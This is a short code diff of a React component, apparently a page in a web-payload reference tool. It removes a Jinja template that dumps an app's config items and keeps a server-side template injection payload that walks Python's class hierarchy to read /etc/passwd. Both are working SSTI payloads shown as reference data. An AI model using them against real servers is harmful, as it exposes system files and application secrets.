@@ -4,14 +4,6 @@ import QueueAnim from 'rc-queue-anim';
 const { Title, Paragraph } = Typography;
 
 export default (props) => {
-	const python_jinja_dump = [
-		{
-			title: `{% for key, value in config.iteritems() %}
-        <dt>{{ key|e }}</dt>
-        <dd>{{ value|e }}</dd>
-    		{% endfor %}`
-		}
-	];
 	const python_jinja_read = [
 		{
 			title: `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}`
